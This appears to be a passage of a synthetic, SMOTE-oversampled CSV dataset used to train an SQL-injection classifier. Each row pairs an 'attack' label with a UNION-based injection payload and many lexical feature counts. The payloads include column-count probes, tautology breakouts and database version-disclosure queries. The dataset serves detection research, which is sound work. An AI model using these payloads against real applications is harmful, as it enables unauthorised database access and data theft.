id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000160,attack,union,"-9583%""   )    )    union all select 9349,9349,9349,9349,9349,9349,9349--",nearest_attack_euclidean,R000177,0.10567301330615589,73.42629200949756,21.170516803799025,3.65344651088523,14.0,32.34103360759805,14.0,13.085258401899512,0.19073268561064877,0.440332649991348,0.19073268561064877,0.17820197878735441,0.0,1.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,2.0,1.0,0.0,6.085258401899512,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000161,attack,union,"-5225'   )    )    as zats where 5629  =  5629 union all select 5629,5629,5629,5629,5629--",nearest_attack_euclidean,R000125,0.5623048353070006,94.09323395466181,24.818646790932362,3.857399955433893,25.0,35.27458716372945,22.0,11.818646790932362,0.2669491165220587,0.3728814135647061,0.23491522253941166,0.12525424737382357,1.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,2.0,0.0,0.0,4.8186467909323625,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000162,attack,union,"-8258""   )    )    as swjp where 2681  =  2681 union all select 2681,2681,2681,2681,2681,2681--",nearest_attack_euclidean,R000291,0.23467508087859848,93.26818531347627,26.0,3.955886945783993,25.0,34.61454825078101,22.0,11.653637062695253,0.2685195501130766,0.3703687198190775,0.23629720409950739,0.12481452596833856,0.0,1.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,2.0,0.0,0.0,4.653637062695253,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000163,attack,union,"-9932"" union all select 4049,4049,4049--",nearest_attack_euclidean,R000192,0.0565625627658641,39.768681854972925,19.046263629005416,3.9471787490669668,14.0,15.814945483978338,4.0,5.9537363709945845,0.35231318145027074,0.39735636405683344,0.10066090898579165,0.14966954550710418,0.0,1.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.0,0.0,1.953736370994585,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000164,attack,union,"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",nearest_attack_euclidean,R000170,0.33998887099330677,58.529035738971174,21.168602382598078,3.9915295077419,14.0,30.023228591176945,4.0,10.505807147794236,0.24109494458108738,0.5106860665026951,0.06888426988031068,0.1793347190359068,0.0,1.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,1.0,0.0,5.505807147794236,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000165,attack,union,"1' in boolean mode  )   union all select null,null,null,null--",nearest_attack_euclidean,R000176,0.4052204098167875,65.18552369971104,19.0,3.605058284661734,45.54841895976883,1.0,11.0,7.637104739942208,0.6945126728486066,0.01598292835627174,0.17581221191898905,0.11369218687613264,1.0,0.0,2.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,3.6371047399422087,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000166,attack,union,"-5595""   )    )    as xttj where 4562  =  4562 union all select 4562,4562,4562,4562,4562#",nearest_attack_euclidean,R000297,0.34337774432421997,91.45390891269192,27.490781782538384,3.9693481770994494,25.0,33.96312713015354,22.0,10.490781782538384,0.27356589495370576,0.37104867671258945,0.24073798755926104,0.11464744077444382,0.0,1.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,2.0,0.0,0.0,4.490781782538384,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000167,attack,union,"-4347' union all select 6074,6074,6074,6074,6074,6074,6074--",nearest_attack_euclidean,R000103,0.07556565617036524,60.0,19.19512857075005,3.773501857156111,14.0,32.0,4.0,10.0,0.23333333333333334,0.5333333333333333,0.06666666666666667,0.16666666666666666,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.0,0.0,6.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000168,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000302,0.0930453649054698,84.70540163510191,27.07054016351019,4.1264548594527675,29.0,28.56432130808152,15.0,12.14108032702038,0.34264733442021844,0.3368353272664633,0.1772313798725268,0.14328595844079142,3.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,3.14108032702038,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000169,attack,union," select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000024,0.025882704966396716,100.73466378923078,25.0,3.9855362534550975,65.78773103138462,3.053067242153844,24.893865515692312,7.0,0.6530603366419777,0.030337850669332256,0.2471033232625984,0.06949848942609164,0.0,0.0,2.0,0.0,1.0,2.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000170,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000165,0.4850806536064419,95.98102601091318,27.0,3.9764383129407026,25.0,40.99367533697106,17.490513005456588,12.49683766848553,0.26118528927057555,0.42736003747074053,0.1813539470898978,0.1301007261687861,1.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.2484188342427647,0.0,0.0,6.248418834242765,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000171,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000197,0.45618783198946544,84.76621955853227,26.24304876062903,3.9677208485369757,25.0,32.0,17.513902478741944,10.252317079790323,0.2952937765778706,0.3779760340196744,0.20580915566252544,0.12092103373992961,1.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.2523170797903238,0.0,0.0,4.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000172,attack,union,"-4347' union all select 6074,6074,6074,6074,6074,6074,6074--",nearest_attack_euclidean,R000103,0.14600565630392096,58.929389324943884,19.0,3.772672583321577,14.0,31.143511459955107,4.0,9.785877864988777,0.23787531801538958,0.5281424936966976,0.06796437657582559,0.16601781171208718,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.0,0.0,5.785877864988777,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000173,attack,union,"-5322"" union all select 6494,6494,6494,6494,6494,6494--",nearest_attack_euclidean,R000215,0.1418823124250481,53.96070505835124,20.0,3.807099633644667,14.0,27.168564046680988,4.0,8.792141011670248,0.25983641061203006,0.5030441021576799,0.07423897446058,0.16288051276971,0.0,1.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.0,0.0,4.792141011670247,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000174,attack,union,"-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#",nearest_attack_euclidean,R000293,0.006475704750233444,98.96731681156467,28.99673168115647,4.18991990224959,36.973853449251735,32.0,16.993463362312934,13.0,0.37358083866167624,0.3233510228157906,0.17170678550361831,0.13136135301891494,3.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,4.0,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.996731681156467,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.996731681156467
SMOTE_000175,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000173,1.1250508730098718,43.10467023257126,20.348840034455,3.92087413777402,18.38373011197875,10.697680068910001,9.01163002584125,5.01163002584125,0.4221704149234715,0.24439911305803763,0.2167589484175663,0.11667152360092455,0.33721000861375017,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.6744200172275003,3.0,0.3372100086137501,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000176,attack,union,"-9384%"" union all select 7031,7031,7031,7031,7031,7031,7031,7031,7031#",nearest_attack_euclidean,R000077,1.5776334307636828,70.0,22.591077712719454,3.7603864208443922,14.0,40.0,4.0,12.0,0.2,0.5714285714285714,0.05714285714285715,0.17142857142857143,0.40892228728054625,0.5910777127194538,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,1.0,0.0,8.0,1.0,0.40892228728054625,0.5910777127194538,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000177,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000161,0.26377872423267884,85.0094527849986,19.0,3.4317470495397413,61.40756222799888,1.0,11.0,11.60189055699972,0.7214886848923152,0.011895653804194661,0.13085219184614144,0.13576346945734874,1.0,0.0,2.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,7.601890556999722,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000178,attack,union," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000006,0.30103056582506227,111.57299274750868,27.85766424916956,3.9687944962612405,65.43065699667824,4.142335750830437,32.0,10.0,0.5863709094276204,0.037160028923900246,0.28683357077979377,0.08963549086868555,0.0,0.0,2.0,0.0,1.14233575083044,2.0,0.0,2.0,0.0,0.0,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000179,attack,union,"-1447"" union all select 3013,3013,3013,3013,3013,3013,3013--",nearest_attack_euclidean,R000240,0.2155809629465391,58.850257805507944,19.22994843889841,3.6765296743419547,14.0,31.08020624440635,4.0,9.770051561101589,0.2382110274917845,0.5277588257236748,0.06806029356908128,0.16596985321545935,0.0,1.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.0,0.0,5.770051561101588,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000180,attack,union,"-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#",nearest_attack_euclidean,R000293,0.029515230161101136,98.92892620091628,28.985785240183255,4.190101847049732,36.886281921466036,32.05685903926698,16.97157048036651,13.014214759816745,0.37281019135947085,0.3240816039606824,0.17154456610151597,0.13156363857833078,3.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,4.014214759816745,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.985785240183255,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.9857852401832545
SMOTE_000181,attack,union,"-8893%'  )   union all select 1254,1254--",nearest_attack_euclidean,R000126,0.08062697359419622,41.486229899851324,22.967584673343246,4.189108878427854,14.0,12.38898391988106,8.0,7.097245979970265,0.3384985981716383,0.2970877970021374,0.1934277703837933,0.170985834442431,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,1.0972459799702645,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000182,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000022,0.4266567447739267,98.24573301251291,26.68856674687177,3.7347703377197665,49.0,3.0,34.24573301251291,12.0,0.4989240667946174,0.03054637143640515,0.3483440760233568,0.1221854857456206,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.311433253128228,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000183,attack,union,"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",nearest_attack_euclidean,R000255,0.0656623249652069,61.51878419523369,20.0,3.6436888365292313,14.0,32.415027356186954,4.0,11.103756839046738,0.22770417815865085,0.526754986209619,0.0650583366167574,0.1804824990149728,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,1.0,0.0,6.1037568390467385,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000184,attack,union,"-7945%'   )    )     )   union all select 4286,4286,4286,4286,4286,4286--",nearest_attack_euclidean,R000119,0.40250169992859824,71.7466495547942,22.49865982191768,3.804305980992423,14.0,28.0,16.997319643835358,12.74932991095884,0.19531565395505263,0.39063130791010525,0.2363748271582767,0.17767821097656541,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,2.74932991095884,1.0,0.0,5.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000185,attack,union,"-2085""  )   as hkev where 7730  =  7730 union all select 7730,7730--",nearest_attack_euclidean,R000121,0.741033464393561,70.9647642502028,27.0,4.010549532625876,25.0,20.0,18.54122650017384,7.423537750028974,0.35311390073429993,0.28249112058743997,0.2598759164722698,0.10451906220599029,0.0,1.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.4235377500289728,0.0,0.0,1.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000186,attack,union,"-3667%'   )    )    union all select 3560,3560,3560--",nearest_attack_euclidean,R000222,0.30451371860476806,54.76267302908239,21.0,3.8096160410877093,14.0,16.705069211632956,14.705069211632958,9.352534605816478,0.2567602808004931,0.30463189570267396,0.2679518555883178,0.17065596790851506,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,2.176267302908239,1.0,0.0,2.176267302908239,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000187,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000045,0.6327872335383337,74.52841793561156,32.0,4.388669045492539,44.0,2.0,17.0,11.528417935611563,0.5904565499238523,0.026838934087447808,0.22813093974330656,0.15457357624539333,0.0,0.0,2.0,0.0,1.7642089678057815,1.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,6.5284179356115635,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000188,attack,union," select * from users where id  =  '1' or $<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000057,0.006193941766083178,75.0,32.97678466535421,4.4228260780766675,42.0,3.0,17.0,13.0,0.56,0.03999999999999998,0.22666666666666666,0.17333333333333334,3.0,0.0,2.0,0.0,1.0,1.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000189,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R000221,0.25378721469964494,91.69378359428339,27.508135078285015,4.03809417214378,25.0,33.3550268754267,22.0,11.338756718856677,0.27307282334921285,0.3630834826412595,0.24030408454730728,0.12353960946222041,0.0,1.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,2.0,0.0,0.0,4.3387567188566765,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000190,attack,union," select * from users where id  =  1 or 1#""  (   union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000051,0.12070278412258569,100.64757748535418,26.088105628661456,3.664397960319932,49.0,3.0,36.64757748535418,12.0,0.4869111670121104,0.029810887776251627,0.3640343941066313,0.11924355110500662,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.911894371338544,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000191,attack,union,"-3104"" union all select 5717,5717,5717,5717,5717,5717,5717,5717,5717--",nearest_attack_euclidean,R000099,0.14424477791927282,71.17261176845933,20.0,3.518151816295311,14.0,40.93808941476746,4.0,12.234522353691865,0.19687303528410846,0.5750022453895902,0.05624943865260243,0.17187528067369878,0.0,1.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.0,0.0,8.234522353691865,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000192,attack,union,"-7611  )   as tuje where 6101  =  6101 union all select 6101,6101,6101,6101,6101,6101,6101,6101--",nearest_attack_euclidean,R000140,0.027585989485763195,97.08891391722922,23.053348350337536,3.675728547806692,25.0,44.07113113378338,16.0,12.017782783445845,0.2575072925075065,0.45391019886991124,0.16480466720480416,0.12377784141777809,0.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,7.0177827834458455,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
